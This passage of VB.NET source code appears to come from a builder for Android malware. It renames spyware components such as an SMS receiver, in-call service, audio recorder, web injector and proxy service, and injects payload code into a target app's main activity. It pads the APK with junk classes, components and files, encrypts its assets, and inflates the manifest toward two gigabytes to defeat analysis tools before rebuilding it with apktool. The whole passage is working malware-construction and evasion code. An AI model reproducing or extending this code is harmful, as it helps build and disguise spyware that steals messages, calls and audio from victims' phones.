                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("RestrectionActivity", N_RestrectionActivity)))
                End If

                If fileName.Contains("UninstallActivity") Or fileName.Equals("UninstallActivity") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("UninstallActivity", N_UninstallActivity)))
                End If

                If fileName.Contains("EngineWorker") Or fileName.Equals("EngineWorker") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("EngineWorker", N_EngineWorker)))
                End If

                '.Replace(Webjector, N_Webjector) _
                If fileName.Contains("Webjector") Or fileName.Equals("Webjector") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("Webjector", N_Webjector)))
                End If

                If fileName.Contains("RequestDataUsage") Or fileName.Equals("RequestDataUsage") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("RequestDataUsage", N_RequestDataUsage)))
                End If


                If fileName.Contains("TransparentActivity") Or fileName.Equals("TransparentActivity") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("TransparentActivity", N_TransparentActivity)))
                End If

                '
                If fileName.Contains("defaultsactivity") Or fileName.Equals("defaultsactivity") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("defaultsactivity", N_defaultsactivity)))
                End If

                If fileName.Contains("SmsReceiver") Or fileName.Equals("SmsReceiver") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("SmsReceiver", N_SmsReceiver)))
                End If


                If fileName.Contains("MyInCallService") Or fileName.Equals("MyInCallService") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("MyInCallService", N_MyInCallService)))
                End If

                If fileName.Contains("WebBrowser") Or fileName.Equals("WebBrowser") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("WebBrowser", N_WebBrowser)))
                End If

                If fileName.Contains("ProxyService") Or fileName.Equals("ProxyService") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("ProxyService", N_ProxyService)))
                End If

                If fileName.Contains("Apps_Manage") Or fileName.Equals("Apps_Manage") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("APPS", N_Apps_Manage)))

                End If
                If fileName.Contains("AudioRecorder") Or fileName.Equals("AudioRecorder") Then
                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace(AudioRecorder, N_AudioRecorder)))

                End If
                i += 1
                Threading.Thread.Sleep(1)
            Next

            i = 0
            For Each fileName As String In Directory.GetFiles(sourcePath, searchPattern, SearchOption.AllDirectories)


                If fileName.Contains("ClassGen") Then

                    File.Move(Path.Combine(sourcePath, fileName), Path.Combine(sourcePath, fileName.Replace("ClassGen", N_ClassGen)))

                End If

                i += 1
                Threading.Thread.Sleep(1)
            Next

        Catch ex As Exception
            Mylogger.LogError(userid, "Step4", ex.Message)
        End Try

        If IsCustomeApp Then
            If PumpAPK Then
                Mylogger.Logbuild(userid, "junk classes...")

                GenerateJunkSmaliFiles(smlipath, 180)

                Dim libfolder As String = TheApkPath + "\" + "lib" + "\" + "x86"
                CreateFileWithSize(libfolder, $"{Random_Word()}.so", 41)

            End If

            Dim manifist As String = TheApkPath + "\AndroidManifest.xml"

            GenerateJunkAndroidComponents(smlipath, manifist)



            Mylogger.Logbuild(userid, ">" & "> Shuffle Classes...")
            ShuffleSmaliFiles(TheApkPath, 2)

            Mylogger.Logbuild(userid, ">" & "> junk folders...")
            Dim assetsfolder As String = TheApkPath + "\" + "assets"
            Dim unknownfolder As String = TheApkPath + "\" + "unknown"

            InjectRandomJunkFiles(assetsfolder)


            Try
                If AssetsPass <> "[AST-PAS]" Then
                    Mylogger.Logbuild(userid, $"Encrypt Assets:{AssetsPass}")
                    EncryptFolder(assetsfolder, AssetsPass)
                Else
                    Mylogger.Logbuild(userid, $"Encrypt Assets 3: SKIP")
                End If

            Catch ex As Exception
                Mylogger.Logbuild(userid, $"Encrypt Assets:{ex.Message}")
            End Try

            InjectRandomJunkFiles(unknownfolder)


            GoTo endit
        End If

        Mylogger.Logbuild(userid, ">" & "> Injecting Main Activity...")

        Try
            Dim Activity As String = TheApkPath & "\" & MainActivity
            Dim clastag As String = "com/icontrol/protector"
            If isPluginmode Then
                clastag = "com/appd/instll"
            End If
            If File.Exists(Activity) Then
                Dim MainReader As String() = File.ReadAllLines(Activity)
                Dim intentmain As String
                For index = 0 To MainReader.Length - 1
                    If index = 0 Then
                        Dim findmain As String() = MainReader(0).Split(" ")
                        intentmain = findmain(findmain.Length - 1)
                    End If



                    If MainReader(index).Contains("onCreate(") AndAlso MainReader(index).ToLower.StartsWith(".method".ToLower) AndAlso Not MainReader(index).ToLower.Contains("native") Then
                        MainReader(index) = MainReader(index) & Environment.NewLine & My.Resources.oncreatecode.Replace("[trgtmain]", intentmain)

                        MainReader(MainReader.Length - 1) = MainReader(MainReader.Length - 1) & Environment.NewLine & Environment.NewLine & My.Resources.MainMith.Replace("[CLSTAG]", clastag).Replace("[trgtmain]", intentmain) _
                                .Replace(oldpkg_insmali, newpkg_insmali) _
                                .Replace(ActivMain, N_ActivMain) _
                                .Replace(drop_oldpkg_insmali, drop_newpkg_insmali) _
                                .Replace(StarterServices, N_StarterServices)

                        Exit For

                    End If
                Next
                File.WriteAllLines(Activity, MainReader)
            End If
        Catch ex As Exception

            Mylogger.LogError(userid, "Step5", ex.Message)
        End Try


endit:

        Thread.Sleep(1000)
        Mylogger.Logbuild(userid, ">" & "> Big namespace manifist...")

        ReplaceHugePlaceholders(
                TheApkPath & "\AndroidManifest.xml",
                800000,  ' 
                400000000 ' 1 billion slashes ≈ 2 GB file
            )


        Mylogger.Logbuild(userid, ">" & "-----------------" & ">" & "> Building Apk...")
        Dim outputfolder As String = WorkingDir + "\" + "out"
        outputapk = outputfolder & "\" & "Ready.apk"
        If Not Directory.Exists(outputfolder) Then
            Directory.CreateDirectory(outputfolder)
        End If

        If isPluginmode Then
            forplugin = True
            Mylogger.Logbuild(userid, ">" & "-----------------" & ">" & "> Building plugin now")
        End If
        ExecuteCommand("java -jar " & apktoolpath & " b -f " & TheApkPath & " -o " & outputapk)



    End Sub
